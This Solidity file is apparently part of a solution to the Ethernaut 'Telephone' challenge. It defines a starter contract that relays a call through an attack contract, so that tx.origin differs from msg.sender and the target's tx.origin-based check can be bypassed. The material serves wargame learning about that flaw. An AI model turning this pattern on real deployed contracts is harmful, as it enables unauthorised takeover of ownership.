// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./open-zeppelin-provided/Telephone.sol";
import "./TelephoneAttack.sol";

// Origin Contract for telephone attack
contract TelephoneAttackStarter {
    TelephoneAttack contractToCall;

    constructor(address _contractToCall) {
        contractToCall = TelephoneAttack(_contractToCall);
    }

    // Calling attack function in TelephoneAttack. Tx.origin = caller of this contract (me) while msg.sender will be the immediate contract calling attack function (TelephoneAttack)
    // TelephoneAttackStarter -> TelephoneAttack -> Telephone (target contract)
    function attackTelephone() external {
        contractToCall.attackTelephoneContract();
    }
}
